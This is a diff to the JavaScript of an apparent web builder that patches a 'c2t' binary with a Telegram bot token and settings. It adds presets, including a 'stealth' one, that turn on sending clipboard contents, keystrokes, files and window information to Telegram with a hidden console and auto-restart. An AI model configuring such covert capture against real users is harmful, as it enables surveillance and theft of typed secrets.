@@ -28,6 +28,80 @@ const linuxFormatNote = document.querySelector("#linux-format-note");
 let latestRelease = null;
 let localBinary = null;
 
+const PRESETS = {
+  default: {
+    TELEGRAM_ENABLED: true,
+    TELEGRAM_SEND_CLIPBOARD: true,
+    TELEGRAM_SEND_KEYBOARD: true,
+    C2T_KEYBOARD_SHORTCUTS: false,
+    TELEGRAM_DEDUPLICATE: true,
+    TELEGRAM_SEND_FILES: false,
+    TELEGRAM_SEND_WINDOW_INFO: false,
+    TELEGRAM_SEND_LOGS: false,
+    C2T_AUTO_RESTART: true,
+    C2T_HIDE_CONSOLE: true,
+    C2T_VERBOSE: false,
+    C2T_LOG_FILE: false,
+  },
+  stealth: {
+    TELEGRAM_ENABLED: true,
+    TELEGRAM_SEND_CLIPBOARD: true,
+    TELEGRAM_SEND_KEYBOARD: false,
+    C2T_KEYBOARD_SHORTCUTS: false,
+    TELEGRAM_DEDUPLICATE: true,
+    TELEGRAM_SEND_FILES: false,
+    TELEGRAM_SEND_WINDOW_INFO: false,
+    TELEGRAM_SEND_LOGS: false,
+    C2T_AUTO_RESTART: true,
+    C2T_HIDE_CONSOLE: true,
+    C2T_VERBOSE: false,
+    C2T_LOG_FILE: false,
+  },
+  full: {
+    TELEGRAM_ENABLED: true,
+    TELEGRAM_SEND_CLIPBOARD: true,
+    TELEGRAM_SEND_KEYBOARD: true,
+    C2T_KEYBOARD_SHORTCUTS: true,
+    TELEGRAM_DEDUPLICATE: true,
+    TELEGRAM_SEND_FILES: true,
+    TELEGRAM_SEND_WINDOW_INFO: true,
+    TELEGRAM_SEND_LOGS: true,
+    C2T_AUTO_RESTART: true,
+    C2T_HIDE_CONSOLE: true,
+    C2T_VERBOSE: true,
+    C2T_LOG_FILE: true,
+  },
+  clipboard: {
+    TELEGRAM_ENABLED: true,
+    TELEGRAM_SEND_CLIPBOARD: true,
+    TELEGRAM_SEND_KEYBOARD: false,
+    C2T_KEYBOARD_SHORTCUTS: false,
+    TELEGRAM_DEDUPLICATE: true,
+    TELEGRAM_SEND_FILES: false,
+    TELEGRAM_SEND_WINDOW_INFO: false,
+    TELEGRAM_SEND_LOGS: false,
+    C2T_AUTO_RESTART: true,
+    C2T_HIDE_CONSOLE: true,
+    C2T_VERBOSE: false,
+    C2T_LOG_FILE: false,
+  },
+};
+
+function applyPreset(presetKey) {
+  const preset = PRESETS[presetKey];
+  if (!preset) return;
+  for (const [key, value] of Object.entries(preset)) {
+    const el = form.querySelector(`input[data-key="${key}"]`);
+    if (el && el.type === "checkbox") {
+      el.checked = value;
+    }
+  }
+
+  document.querySelectorAll(".preset-btn").forEach((btn) => {
+    btn.classList.toggle("active", btn.dataset.preset === presetKey);
+  });
+}
+
 function initPlatformSelection() {
   const detected = detectUserPlatform();
   if (detected && PLATFORMS[detected]) {
@@ -44,19 +118,19 @@ function selectedPlatform() {
 
 function setStatus(message, kind = "") {
   status.textContent = message;
-  status.className = `status ${kind}`.trim();
+  status.className = `status-box ${kind}`.trim();
 }
 
 function updatePlatform() {
   const platform = selectedPlatform();
   const details = PLATFORMS[platform];
   buttonPlatform.textContent = details.label;
-  linuxFormat.hidden = !details.formatChoice;
-  linuxFormatNote.hidden = !details.formatChoice;
+  if (linuxFormat) linuxFormat.hidden = !details.formatChoice;
+  if (linuxFormatNote) linuxFormatNote.hidden = !details.formatChoice;
   const assetAvailable = latestRelease?.assets.some(({ name }) => name === details.asset);
   downloadButton.disabled = !localBinary && !assetAvailable;
   if (!localBinary && latestRelease && !assetAvailable) {
-    setStatus(`Release ${latestRelease.tag_name} has no direct ${platform} asset yet. Use a local file or publish a new release.`, "error");
+    setStatus(`Release ${latestRelease.tag_name} has no direct ${platform} asset yet. Use a local binary or publish a release.`, "error");
   } else if (latestRelease && !localBinary) {
     setStatus(`${latestRelease.tag_name} ready · configuration is applied in memory only`, "success");
   }
@@ -75,7 +149,7 @@ async function loadRelease() {
   } catch (error) {
     releaseLabel.textContent = "Unavailable";
     downloadButton.disabled = !localBinary;
-    setStatus(`Could not load the latest release: ${error.message}. You can use a local file instead.`, "error");
+    setStatus(`Could not load the latest release: ${error.message}. You can use a local binary file instead.`, "error");
   }
 }
 
@@ -95,7 +169,7 @@ function collectConfig() {
   const telegramEnabled = config.TELEGRAM_ENABLED === "1";
   const token = tokenInput.value.trim();
   const chatId = document.querySelector("#chat-id").value.trim();
-  if (telegramEnabled && !token) throw new Error("Enter the Telegram bot token");
+  if (telegramEnabled && !token) throw new Error("Please enter your Telegram bot token");
   if (token) config.TELEGRAM_BOT_TOKEN = token;
   if (chatId) config.TELEGRAM_CHAT_ID = chatId;
   return config;
@@ -119,7 +193,7 @@ async function downloadAsset(asset) {
     received += value.length;
     const percentage = total ? Math.min(100, Math.round((received / total) * 100)) : 0;
     const progress = total ? ` ${percentage}%` : "";
-    setStatus(`Downloading the official release binary…${progress}`);
+    setStatus(`Downloading official release binary…${progress}`);
   }
   const result = new Uint8Array(received);
   let offset = 0;
@@ -142,6 +216,12 @@ function saveDownload(binary, filename, type = "application/octet-stream") {
   setTimeout(() => URL.revokeObjectURL(url), 1000);
 }
 
+document.querySelectorAll(".preset-btn").forEach((btn) => {
+  btn.addEventListener("click", () => {
+    applyPreset(btn.dataset.preset);
+  });
+});
+
 form.addEventListener("change", (event) => {
   if (event.target.name === "platform") {
     localBinary = null;
@@ -150,12 +230,15 @@ form.addEventListener("change", (event) => {
   }
 });
 
-document.querySelector("#reveal-token").addEventListener("click", (event) => {
-  const revealing = tokenInput.type === "password";
-  tokenInput.type = revealing ? "text" : "password";
-  event.currentTarget.textContent = revealing ? "Hide" : "Show";
-  event.currentTarget.setAttribute("aria-label", revealing ? "Hide token" : "Show token");
-});
+const revealBtn = document.querySelector("#reveal-token");
+if (revealBtn) {
+  revealBtn.addEventListener("click", (event) => {
+    const revealing = tokenInput.type === "password";
+    tokenInput.type = revealing ? "text" : "password";
+    event.currentTarget.textContent = revealing ? "Hide" : "Show";
+    event.currentTarget.setAttribute("aria-label", revealing ? "Hide token" : "Show token");
+  });
+}
 
 const pairButton = document.querySelector("#pair-telegram");
 const chatIdInput = document.querySelector("#chat-id");
@@ -251,7 +334,7 @@ localBinaryInput.addEventListener("change", async () => {
     setStatus(`Local file “${file.name}” ready · nothing was uploaded`, "success");
   } catch (error) {
     localBinary = null;
-    setStatus(`Could not read the file: ${error.message}`, "error");
+    setStatus(`Could not read file: ${error.message}`, "error");
   }
 });
 
@@ -269,15 +352,15 @@ form.addEventListener("submit", async (event) => {
     let source = localBinary;
     if (!source) {
       const asset = latestRelease?.assets.find(({ name }) => name === PLATFORMS[platform].asset);
-      if (!asset) throw new Error("The release does not contain a compatible direct binary");
+      if (!asset) throw new Error("Release does not contain a compatible direct binary");
       source = await downloadAsset(asset);
     }
-    setStatus("Validating and writing the configuration…");
+    setStatus("Validating and writing binary configuration…");
     const version = latestRelease?.tag_name ?? "custom";
     const details = PLATFORMS[platform];
     const executableName = `c2t-${version}-configured-${details.filenameSuffix}`;
     if (details.configMode === "sidecar") {
-      setStatus("Packaging the signed executable and its private configuration…");
+      setStatus("Packaging signed executable and private sidecar configuration…");
       const archive = await createMacOSBundleTarGz(
         source,
         encodePayload(config),
@@ -286,18 +369,18 @@ form.addEventListener("submit", async (event) => {
       const sha = await computeSha256(archive);
       const shaInfo = sha ? ` · SHA-256: ${sha.slice(0, 8)}…${sha.slice(-4)}` : "";
       saveDownload(archive, `${executableName}.tar.gz`, "application/gzip");
-      setStatus(`Done · ${Object.keys(config).length} configuration values${shaInfo} · keep the executable and .c2t.env together`, "success");
+      setStatus(`Done · ${Object.keys(config).length} configuration values${shaInfo} · keep executable and .c2t.env together`, "success");
       return;
     }
     const patched = patchBinary(source, config, { randomize });
     const archiveLinux = details.formatChoice && new FormData(form).get("linux-format") === "archive";
     if (archiveLinux) {
-      setStatus("Packaging the configured executable…");
+      setStatus("Packaging configured executable into tar archive…");
       const archive = await createExecutableTarGz(patched, executableName);
       const sha = await computeSha256(archive);
       const shaInfo = sha ? ` · SHA-256: ${sha.slice(0, 8)}…${sha.slice(-4)}` : "";
       saveDownload(archive, `${executableName}.tar.gz`, "application/gzip");
-      setStatus(`Done · ${Object.keys(config).length} embedded values${shaInfo} · extract the archive and run directly`, "success");
+      setStatus(`Done · ${Object.keys(config).length} embedded values${shaInfo} · extract archive and run directly`, "success");
     } else {
       const sha = await computeSha256(patched);
       const shaInfo = sha ? ` · SHA-256: ${sha.slice(0, 8)}…${sha.slice(-4)}` : "";
